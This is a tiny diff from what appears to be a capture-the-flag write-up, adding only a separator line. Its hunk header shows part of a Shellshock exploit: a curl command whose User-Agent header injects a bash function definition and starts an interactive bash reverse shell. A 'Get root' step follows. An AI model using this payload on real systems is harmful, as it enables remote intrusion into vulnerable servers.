@@ -72,6 +72,7 @@ curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >
 + Get root.
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c4f85588-6979-435d-b7ef-466ca66b7e4d)
 
+---
 
 # Links
 
